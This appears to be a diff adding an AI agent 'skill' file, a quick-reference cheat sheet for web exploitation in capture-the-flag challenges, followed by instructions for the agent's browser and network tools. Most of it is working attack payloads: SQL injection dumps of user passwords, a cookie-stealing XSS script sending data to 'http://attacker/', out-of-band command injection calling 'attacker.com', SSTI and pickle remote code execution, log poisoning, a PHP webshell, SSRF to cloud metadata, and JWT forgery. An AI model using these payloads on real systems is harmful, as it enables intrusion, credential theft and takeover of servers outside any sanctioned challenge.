@@ -1,0 +1,298 @@
+# CTF Web Exploitation Skill
+
+Quick reference. Recon fast, exploit targeted.
+
+---
+
+## Recon (do this first, every web challenge)
+
+```bash
+# 1. What's the tech stack?
+curl -sI http://target | head -20          # Server, X-Powered-By, Set-Cookie
+curl -s http://target/ | head -100         # HTML comments, JS files, hints
+
+# 2. Check common files
+curl -s http://target/robots.txt
+curl -s http://target/.git/HEAD            # Git leak
+curl -s http://target/.env                 # Environment variables
+curl -s http://target/sitemap.xml
+curl -s http://target/.DS_Store
+
+# 3. Identify language
+# .php → PHP, errors with Traceback → Python, /WEB-INF → Java
+# Cookie names: PHPSESSID=PHP, connect.sid=Node, JSESSIONID=Java
+```
+
+**After recon you should know:** backend language, interesting endpoints, cookies, headers.
+
+---
+
+## SQL Injection
+
+```bash
+# Detection
+curl "http://target/search?q=test'"                      # Error = SQLi likely
+curl "http://target/search?q=test' OR '1'='1"            # Boolean test
+curl "http://target/search?q=test' UNION SELECT null--"  # Column count
+
+# UNION-based extraction
+' UNION SELECT 1,2,3--                           # Find visible columns
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
+
+# Blind SQLi (boolean)
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
+
+# Time-based
+' AND SLEEP(5)--                                  # MySQL
+' AND pg_sleep(5)--                               # PostgreSQL
+
+# sqlmap (if automated tools allowed)
+sqlmap -u "http://target/search?q=test" --dbs --batch
+sqlmap -u "http://target/search?q=test" -D dbname -T users --dump --batch
+```
+
+---
+
+## Cross-Site Scripting (XSS)
+
+```bash
+# Basic test
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+
+# Filter bypass
+<ScRiPt>alert(1)</ScRiPt>                # Case bypass
+<img src=x onerror="alert`1`">           # Backtick bypass
+<svg/onload=alert(1)>                     # SVG event
+javascript:alert(1)                       # Protocol handler
+
+# Cookie stealing
+<script>fetch('http://attacker/'+document.cookie)</script>
+```
+
+---
+
+## Server-Side Template Injection (SSTI)
+
+```bash
+# Detection — inject in every input field
+{{7*7}}        → 49 = Jinja2/Twig
+${7*7}         → 49 = Freemarker/Velocity
+<%= 7*7 %>     → 49 = ERB (Ruby)
+#{7*7}         → 49 = Thymeleaf
+
+# Jinja2 RCE
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+---
+
+## Local File Inclusion (LFI) / Path Traversal
+
+```bash
+# Basic
+http://target/page?file=../../../../etc/passwd
+http://target/page?file=....//....//....//etc/passwd    # Filter bypass
+
+# PHP wrappers
+http://target/page?file=php://filter/convert.base64-encode/resource=index.php
+http://target/page?file=php://input    # POST body as code
+http://target/page?file=data://text/plain,<?php system('id')?>
+
+# Log poisoning (Apache)
+# 1. Inject PHP in User-Agent via curl
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
+# 2. Include log file
+http://target/page?file=/var/log/apache2/access.log&cmd=cat+/flag.txt
+```
+
+---
+
+## Server-Side Request Forgery (SSRF)
+
+```bash
+# Basic
+http://target/fetch?url=http://127.0.0.1:8080/admin
+http://target/fetch?url=file:///etc/passwd
+
+# Bypass filters
+http://0x7f000001/                       # Hex IP
+http://127.1/                            # Short form
+http://[::1]/                            # IPv6 localhost
+http://target/fetch?url=http://attacker.com/redirect → http://127.0.0.1
+
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/  # AWS
+http://metadata.google.internal/          # GCP
+```
+
+---
+
+## Authentication Bypass
+
+```bash
+# Default credentials
+admin:admin  admin:password  admin:123456  root:root  guest:guest
+
+# JWT manipulation
+# 1. Decode: echo "JWT_TOKEN" | cut -d. -f2 | base64 -d
+# 2. Change alg to "none": {"alg":"none","typ":"JWT"}
+# 3. Change role: {"role":"admin"}
+# 4. Reassemble with empty signature: header.payload.
+
+# PHP type juggling
+password=0        # "0" == "any_string_starting_with_non_number" is true
+password[]=       # Array bypass: strcmp([], "password") = NULL = 0
+
+# Mass assignment
+POST /register {"username":"me","password":"pass","role":"admin"}
+```
+
+---
+
+## Command Injection
+
+```bash
+# Detection
+; id
+| id
+$(id)
+`id`
+
+# Blind (out-of-band)
+; curl http://attacker.com/$(whoami)
+; ping -c 1 attacker.com
+
+# Filter bypass
+;c'a't /flag.txt                    # Quote bypass
+;cat${IFS}/flag.txt                 # Space bypass using IFS
+;{cat,/flag.txt}                    # Brace expansion
+```
+
+---
+
+## File Upload
+
+```bash
+# PHP webshell upload
+# filename: shell.php, shell.php5, shell.phtml, shell.pHP
+# content: <?php system($_GET['cmd']); ?>
+
+# Bypass extension filter
+shell.php.jpg                        # Double extension
+shell.php%00.jpg                     # Null byte (old PHP)
+shell.php/.                          # Path trick
+
+# Bypass content-type check
+# Set Content-Type: image/jpeg in request
+
+# Access shell
+curl "http://target/uploads/shell.php?cmd=cat+/flag.txt"
+```
+
+---
+
+## Deserialization
+
+```python
+# Python pickle RCE
+import pickle, os, base64
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+print(base64.b64encode(pickle.dumps(Exploit())))
+```
+
+```php
+# PHP deserialization
+# Look for unserialize() on user input
+# Craft object with __wakeup() or __destruct() magic methods
+```
+
+---
+
+## Useful Tools
+
+```bash
+# Proxy
+# Use Burp Suite or mitmproxy to intercept/modify requests
+
+# Directory scan (if allowed)
+gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# CyberChef for encoding/decoding
+# https://gchq.github.io/CyberChef/
+```
+
+---
+
+## Browser Tool vs Network Tool
+
+Use the **`network`** tool (curl-like) for:
+- Simple HTTP requests (GET, POST)
+- Checking headers, status codes, cookies
+- Sending crafted payloads (SQLi, SSTI, etc.)
+- Raw TCP connections
+
+Use the **`browser`** tool (headless Chromium) for:
+- Pages that require **JavaScript rendering** to show content
+- **Multi-step form interactions** (login then navigate)
+- Challenges that need a **real browser session** (cookies, CSRF tokens)
+- **DOM inspection** after JS execution
+- **Intercepting requests** made by client-side JavaScript
+- **Cookie manipulation** in a browser context
+
+### Browser Quick Reference
+
+```
+# Navigate to a page
+browser(action="navigate", url="http://target/")
+
+# Fill a form and submit
+browser(action="type", selector="#username", text="admin")
+browser(action="type", selector="#password", text="password")
+browser(action="click", selector="button[type=submit]")
+
+# Read page content after JS rendering
+browser(action="get_text")
+browser(action="get_html", selector="#flag-container")
+
+# Run JavaScript in page context
+browser(action="execute_js", script="document.cookie")
+
+# List all forms and links for recon
+browser(action="list_forms")
+browser(action="list_links")
+
+# Manipulate cookies
+browser(action="get_cookies")
+browser(action="set_cookie", cookie_name="role", cookie_value="admin")
+
+# Make authenticated fetch from browser context
+browser(action="send_request", url="http://target/api/flag", method="GET")
+
+# Close when done
+browser(action="browser_close")
+```
+
+**Rule of thumb:** Start with `network` tool. Switch to `browser` only when
+you see JavaScript-dependent content, need stateful sessions, or `network`
+results don't match what a real browser would see.
+
+---
+
+## CRITICAL RULES FOR AGENT
+
+1. **Recon first** — identify stack before attacking
+2. **Try simple payloads before complex ones**
+3. **Read the source** — HTML comments and JS files often have hints
+4. **Don't brute force** unless CTF explicitly allows it
+5. **Check cookies and headers** — flags sometimes hide there
